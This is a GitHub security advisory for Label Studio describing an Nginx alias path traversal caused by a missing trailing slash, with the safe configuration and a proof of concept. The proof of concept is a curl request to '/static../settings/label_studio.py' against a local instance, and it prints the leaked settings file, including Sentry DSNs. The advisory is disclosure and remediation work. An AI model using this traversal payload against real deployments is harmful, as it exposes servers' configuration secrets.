# [H] Nginx alias path traversal allows unauthenticated attackers to read all files on /label_studio/core/

## Summary
Severity: High
Advisory: GHSA-cpmr-mw4j-99r7
Ecosystem: PyPI
CVSS: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N (CVSS_V3)
Published: 2023-03-24
Source: https://github.com/advisories/GHSA-cpmr-mw4j-99r7
Type: github-advisory

## Affected
- PyPI: `label-studio` — affected >=0 <1.7.2

## Details
### Summary
The vulnerability resides on the Nginx config file:
https://github.com/heartexlabs/label-studio/blob/53944e6bcede75ca5c102d655013f2e5238e85e6/deploy/default.conf#L119

The pattern on location /static indicates a popular misconfiguration on Nginx servers presented in 2018 originally by Orange Tsai. This vulnerability allows an attacker to use a single path traversal payload in the matched location to traverse one directory above. This vulnerability only happens due to the location /static directive not having a slash `/` at the end, the following code shows an example of a safe configuration:
```nginx
location /static/ {
[...]
```
The vulnerability works because Nginx will think that `/static../` is a directory that should also be aliased to the folder, allowing /static/../ to be reached. In Label Studio's case, this means all files on /label_studio/core/ are exposed.

Of course, this means that only Label Studio instances that were deployed using the default nginx files introducted at Mar 31, 2021.
This is a very easy vulnerability to fix, and just a lesser-known configuration mistake on nginx files. It's very easy to happen because all is needed is for one slash to be missing. (Off-By-One)

** Proof-of-Concept (Leaking Secret Keys): **
Exploiting this vulnerability usually depends on what's on the parent folder, in Label Studio's case the most interesting file I could find that's on there by default is /label_studio/core/ . We can fetch it by simply making a request to the traversed folder.
```bash
# Production Label Studio docker-compose running on localhost:8080
/t/mydata [127]$ curl localhost:8080/static../settings/label_studio.py
"""This file and its contents are licensed under the Apache License 2.0. Please see the included NOTICE for copyright information and LICENSE for a copy of the license.
"""
import os
import pathlib

from core.settings.base import *

DJANGO_DB = get_env('DJANGO_DB', DJANGO_DB_SQLITE)
DATABASES = {'default': DATABASES_ALL[DJANGO_DB]}

MIDDLEWARE.append('organizations.middleware.DummyGetSessionMiddleware')
MIDDLEWARE.append('core.middleware.UpdateLastActivityMiddleware')
if INACTIVITY_SESSION_TIMEOUT_ENABLED:
    MIDDLEWARE.append('core.middleware.InactivitySessionTimeoutMiddleWare')

ADD_DEFAULT_ML_BACKENDS = False

LOGGING['root']['level'] = get_env('LOG_LEVEL', 'WARNING')

DEBUG = get_bool_env('DEBUG', False)

DEBUG_PROPAGATE_EXCEPTIONS = get_bool_env('DEBUG_PROPAGATE_EXCEPTIONS', False)

SESSION_COOKIE_SECURE = False

SESSION_ENGINE = "django.contrib.sessions.backends.signed_cookies"

RQ_QUEUES = {}

SENTRY_DSN = get_env(
    'SENTRY_DSN',
    'https://68b045ab408a4d32a910d339be8591a4@o227124.ingest.sentry.io/5820521'
)
SENTRY_ENVIRONMENT = get_env('SENTRY_ENVIRONMENT', 'opensource')

FRONTEND_SENTRY_DSN = get_env(
    'FRONTEND_SENTRY_DSN',
    'https://5f51920ff82a4675a495870244869c6b@o227124.ingest.sentry.io/5838868')
FRONTEND_SENTRY_ENVIRONMENT = get_env('FRONTEND_SENTRY_ENVIRONMENT', 'opensource')

EDITOR_KEYMAP = json.dumps(get_env("EDITOR_KEYMAP"))

from label_studio import __version__
from label_studio.core.utils import sentry
sentry.init_sentry(release_name='label-studio', release_version=__version__)

# we should do it after sentry init
from label_studio.core.utils.common import collect_versions
versions = collect_versions()

# in Label Studio Community version, feature flags are always ON
FEATURE_FLAGS_DEFAULT_VALUE = True
# or if file is not set, default is using offline mode
FEATURE_FLAGS_OFFLINE = get_bool_env('FEATURE_FLAGS_OFFLINE', True)

from core.utils.io import find_file
FEATURE_FLAGS_FILE = get_env('FEATURE_FLAGS_FILE', 'feature_flags.json')
FEATURE_FLAGS_FROM_FILE = True
try:
    from core.utils.io import find_node
    find_node('label_studio', FEATURE_FLAGS_FILE, 'file')
except IOError:
    FEATURE_FLAGS_FROM_FILE = False

STORAGE_PERSISTENCE = get_bool_env('STORAGE_PERSISTENCE', True)
```


### Impact
The impact consists on leaking Django secret keys by default, with also greater risk being possible due to the vulnerability exposing the file located at /label_studio/core/settings/label_studio.py which contains the secret key for Django as well as possibly containing other secrets the user might put there. (If the administrator decides not to use environment variables for some variables)

## References
- https://github.com/heartexlabs/label-studio/security/advisories/GHSA-cpmr-mw4j-99r7
- https://github.com/HumanSignal/label-studio/commit/60a3ef57a22c50d7230a56c11d85e14454c99a28
- https://github.com/heartexlabs/label-studio
- https://github.com/heartexlabs/label-studio/blob/53944e6bcede75ca5c102d655013f2e5238e85e6/deploy/default.conf#L119
